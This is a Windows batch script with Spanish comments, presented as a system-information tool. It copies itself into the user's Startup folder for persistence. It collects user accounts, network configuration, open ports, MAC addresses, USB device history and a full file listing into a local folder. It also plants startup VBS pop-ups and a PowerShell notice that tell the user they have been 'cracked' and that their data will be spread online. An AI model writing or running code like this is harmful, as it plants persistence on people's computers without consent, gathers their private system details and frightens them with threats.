@ECHO OFF
chcp 1252

dir /b
CLS
set tiempo=%time:~0,5%
set fecha=%date:~0%
set file=%fecha% %tiempo% 

REM Registro que almacena las variables de entorno
REM User Environment Variables: HKCU\Environment
REM System Environment Variables: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
REM Volatile variables are defined under the registry: HKCU\Volatile Environment

REM .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC (Determine the default executable file extensions to search for and use, and in which order, left to right. The syntax is like the PATH variable - semicolon separators.)
SET "=%PATHEXT%"
REM C:\ProgramData
SET "programDataPath=%ALLUSERSPROFILE%"
REM C:\User\UserName\AppData\Roaming
SET "appDataPath=%APPDATA%"
REM C:
SET "homeDrivePath=%HOMEDRIVE%"
REM C:
SET "systemDrivePath=%SYSTEMDRIVE%"
REM \\USER (LOGON SERVER)
SET "logonServerInfo=%LOGONSERVER%"
REM C:\User\UserName\AppData\Local
SET "localAppData=%LOCALAPPDATA%"
REM USUARIO
SET "nombreUusario=%USERNAME%"
REM \Users\UserName
SET "homePathUsuario=%HOMEPATH%"
REM C:\ProgramData
SET "porgramDataPath=%ProgramData%"
REM AMD 64
SET "processorArqVar=%PROCESSOR_ARCHITECTURE%"
REM C:\Windows Set by default as windir=%SystemRoot%
SET "systemRootPathWinDir=%WINDIR%"
REM in case WinDir no sea el root path entonces la siguiente variable si lo sera, aunque normalmente ambas son lo mismo
SET "systemRootPathSys=%SystemRoot%"
REM C:\Users\Usuario
SET "userProfileVar=%USERPROFILE%"
REM Usuario
SET "dominioDeUsuario=%USERDOMAIN%"
REM C:\Users\Public
SET "publicPathVar=%Public%"
REM C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
SET "powerShellNModulesPathVar=%PSModulePath%"
REM C:\Program Files
SET "programFilesBoth=%ProgramW6432%"
REM C:\Program Files
SET "programFiles86x=%ProgramFiles(x86)%"
REM C:\Program Files
SET "programFiles32x=%ProgramFiles%"
REM C:\Users\Usuario\AppData\Local\Temp
SET "tempPathVar=%TEMP%"
REM Console
SET "nombreDeLaSesion=%SessionName%"
REM path en windows donde ejecuta los archivos al arrancar windows
SET "pathAutoStart=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
REM Default browser
SET "defaultBrowserVar=%FPS_BROWSER_USER_PROFILE_STRING%"
REM VirtualBox Env Var
SET "vboxEnvVar=%VBOX_MSI_INSTALL_PATH%"
REM C:\Windows\system32\
SET "system32Path=%__APPDIR__%"
REM The boot type of the system: Legacy, UEFI, Not implemented, Unknown Windows 8/2012.
SET "=%FIRMWARE_TYPE%"

SET "numberOfProcessorsVar=%NUMBER_OF_PROCESSORS%"
REM The most recent exit code returned by an external command, as ASCII. (Values 0-32 do not display because those map to ASCII control codes.)
SET "exitCodeASCII=%ExitCodeAscii%"
REM The most recent exit code returned by an external command, such as CMD /C EXIT n, converted to hex.
SET "exitCodeHEX=%ExitCode%"

rem RMDIR /s /q CD C:\TXT_FILES
if not exist "C:\TXT_FILES\" mkdir C:\TXT_FILES
IF EXIST "C:\TXT_FILES\Reporte.csv" (
    REM DEL C:\TXT_FILES\Reporte.txt
)
IF EXIST "C:\TXT_FILES\setupapi.dev.log" (
    REM DEL C:\TXT_FILES\setupapi.dev.log	
)

rem autocopiar este script en varias locaciones
COPY "obtenerInfoDeLaCompu.bat" "obtenerInfoDeLaCompu2.bat"
COPY "obtenerInfoDeLaCompu.bat" "obtenerInfoDeLaCompuStart.bat"
MOVE "obtenerInfoDeLaCompu2.bat" "C:\TXT_FILES\obtenerInfoDeLaCompu2.bat"
MOVE "obtenerInfoDeLaCompuStart.bat" "%pathAutoStart%\obtenerInfoDeLaCompuStart.bat"


@ECHO -------------------------INFORMACION DEL SISTEMA------------------------>>"C:\TXT_FILES\details.txt"
systeminfo > C:\TXT_FILES\details.txt

ECHO ------------------------INFORMACION SOBRE DRIVERS------------------------>>"C:\TXT_FILES\details.txt"
driverquery > C:\TXT_FILES\drivers.txt

ECHO ---------------------INFORMACION DE LA IP--------------------------------->>"C:\TXT_FILES\drivers.txt"
ipconfig > C:\TXT_FILES\ipInfo.txt

ECHO -------------------INFORMACION DEL HARD DISK------------------------------->>"C:\TXT_FILES\ipInfo.txt"
vol > C:\TXT_FILES\hardDiskInfo.txt

ECHO --------------INFORMACION SOBRE RESTRICCIONES DEL USUARIO------------------>>"C:\TXT_FILES\hardDiskInfo.txt"
NET ACCOUNTS > C:\TXT_FILES\restricciones.txt

ECHO --------------INFORMACION SERVICIOS QUE SE PUEDEN CONTROLAR----------------->>"C:\TXT_FILES\restricciones.txt"
NET CONFIG > C:\TXT_FILES\controlar.txt

ECHO ---------------------INFORMACION DE USUARIOS-------------------------------->>"C:\TXT_FILES\controlar.txt"
NET USER > C:\TXT_FILES\userDetails.txt

ECHO ----------------ESTADISTICAS DE LOS USUARIOS DEL SISTEMA-------------------->>"C:\TXT_FILES\userDetails.txt
NET STATISTICS > C:\TXT_FILES\statisticsUsers.txt

ECHO --------------ESTADISTICAS DEL SERVIDOR DEL SISTEMA-------------------------->>"C:\TXT_FILES\statisticsUsers.txt
NET STATISTICS SERVER > C:\TXT_FILES\statisticsServer.txt

ECHO ---------------ESTADISTICAS DE LA ESTACION DE TRABAJO----------------------->>"C:\TXT_FILES\statisticsServer.txt
NET STATISTICS WORKSTATION > C:\TXT_FILES\statisticsWorkstation.txt

ECHO ----------------------VARIABLES DE ENTORNO--------------------------------->>"C:\TXT_FILES\statisticsWorkstation.txt"
SET | more > C:\TXT_FILES\variablesDeEntorno.txt

ECHO ---------------------INFORMACION DE LA WLAN-------------------------------->>"C:\TXT_FILES\variablesDeEntorno.txt"
NETSH WLAN SHOW INTERFACE > C:\TXT_FILES\wlanInterface.txt

ECHO ---------------------INFORMACION DE LA LAN--------------------------------->>"C:\TXT_FILES\wlanInterface.txt"
NETSH LAN SHOW INTERFACE > C:\TXT_FILES\lanInterface.txt

ECHO -----------------------------MAC ADDRESS------------------------------------>>"C:\TXT_FILES\lanInterface.txt"
GETMAC > C:\TXT_FILES\macaddress.txt

ECHO ------------------------------HOST NAME------------------------------------->>"C:\TXT_FILES\macaddress.txt"
HOSTNAME > C:\TXT_FILES\hostname.txt

ECHO ---------------------------CONEXIONES TCP----------------------------------->>"C:\TXT_FILES\hostname.txt"
NETSTAT > C:\TXT_FILES\tcpconnections.txt

ECHO ---------------------------ESTADO DE TCP------------------------------------>>"C:\TXT_FILES\tcpconnections.txt"
NETSTAT > C:\TXT_FILES\estadoTCP.txt

ECHO ---------------------------TABLA DE RUTEO------------------------------------>>"C:\TXT_FILES\estadoTCP.txt
NETSTAT -s > C:\TXT_FILES\tablaDeRuteo.txt

ECHO ----------------------PUERTOS EN LISTENING STATUS--------------------------->>"C:\TXT_FILES\tablaDeRuteo.txt
NETSTAT -aon > C:\TXT_FILES\listeningPorts.txt

ECHO -------------------------INTERFACES DE RED---------------------------------->>"C:\TXT_FILES\listeningPorts.txt
arp /a > C:\TXT_FILES\networkInterfaces.txt

REM desmontar unidad extraible pero requiere root acces
REM MOUNTVOL /R

FOR /F "tokens=2 delims=\ " %%A IN ('REG Query "HKLM\SYSTEM\MountedDevices" /v "\DosDevices\*" ^| FINDSTR /R /E /C:" 5F[0-9A-F]*"') DO cd \ && cd windows/system32 && ECHO.%%A > C:\TXT_FILES\USBFlashDrives.txt

XCOPY /s C:\Windows\inf\setupapi.dev.log C:\TXT_FILES /C /

ECHO ****REPORTE DE INFORMACION DEL USUARIO*****>>"C:\TXT_FILES\Reporte.txt"
TYPE C:\TXT_FILES\details.txt C:\TXT_FILES\drivers.txt C:\TXT_FILES\ipInfo.txt C:\TXT_FILES\hardDiskInfo.txt C:\TXT_FILES\restricciones.txt C:\TXT_FILES\controlar.txt C:\TXT_FILES\userDetails.txt C:\TXT_FILES\statisticsUsers.txt C:\TXT_FILES\statisticsServer.txt C:\TXT_FILES\statisticsWorkstation.txt C:\TXT_FILES\variablesDeEntorno.txt C:\TXT_FILES\wlanInterface.txt C:\TXT_FILES\lanInterface.txt C:\TXT_FILES\macaddress.txt C:\TXT_FILES\hostname.txt C:\TXT_FILES\tcpconnections.txt C:\TXT_FILES\estadoTCP.txt C:\TXT_FILES\tablaDeRuteo.txt C:\TXT_FILES\listeningPorts.txt C:\TXT_FILES\networkInterfaces.txt > C:\TXT_FILES\Reporte.txt

CLS
REM TYPE C:\TXT_FILES\Reporte.txt | find /v "Se ha completado el comando correctamente."
setlocal EnableDelayedExpansion
for /F "delims=" %%a in (C:\TXT_FILES\Reporte.txt) do (
   set "line="
   for %%b in (%%a) do set "line=!line!,%%b"
   echo !line:~1!
)

IF EXIST "C:\TXT_FILES\msgbox2.vbs" (
    REM DEL C:\TXT_FILES\msgbox2.vbs
)
IF EXIST "C:\TXT_FILES\msgbox.vbs" (
    REM DEL C:\TXT_FILES\msgbox.vbs
)

echo y=msgbox("No te preocupes, los archivos estan programados para borrarse solos despues de ciertos dias y ciertas condiciones que validan que todo esta bien" ,0, "EL VIRUS DESAPARECERA!") >> C:\TXT_FILES\msgbox2.vbs
echo x=msgbox("HAS SIDO CRACKEADO! ADEMAS EL VIRUS SE HA AUTOCOPIADO A MUCHOS SECTORES DE TU PC CON DISTINTOS NOMBRES" ,16, "UPSI") >> C:\TXT_FILES\msgbox.vbs


COPY "C:\TXT_FILES\msgbox2.vbs" "C:\TXT_FILES\msgbox2_2.vbs"
COPY "C:\TXT_FILES\msgbox.vbs" "C:\TXT_FILES\msgbox.vbs_2"
MOVE "C:\TXT_FILES\msgbox2_2.vbs" "%pathAutoStart%\msgbox2_2.vbs"
MOVE "C:\TXT_FILES\msgbox_2.vbs" "%pathAutoStart%\msgbox_2.vbs"

CLS
start msgbox.vbs
timeout /t 6 /nobreak > nul
start msgbox2.vbs

timeout /t 6 /nobreak > nul
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Recuerda que no se te vaya a olvidar', 'No abrir las imagenes mas de 2 veces, o toda tu informacion, IP, Archivos etc. se difundira en la red', [System.Windows.Forms.ToolTipIcon]::None)}"

TYPE C:\TXT_FILES\Reporte.txt C:\TXT_FILES\setupapi.dev.log > C:\TXT_FILES\Tu_Informacion.log
COPY "C:\TXT_FILES\setupapi.dev.log" "C:\TXT_FILES\setupapi_2.dev.log"
COPY "C:\TXT_FILES\Tu_Informacion.log" "C:\TXT_FILES\Tu_Informacion_2.log"
MOVE "C:\TXT_FILES\setupapi_2.dev.log" "%pathAutoStart%\setupapi_2.dev.log"
MOVE "C:\TXT_FILES\Tu_Informacion_2.log" "%pathAutoStart%\Tu_Informacion_2.log"
REM DEL C:\TXT_FILES\*.txt

DIR /b /s C:\*.* > C:\TXT_FILES\archivos.log
REM MATAR EL PROCESO DE EXPLORER
rem taskkill /f /IM explorer.exe
EXIT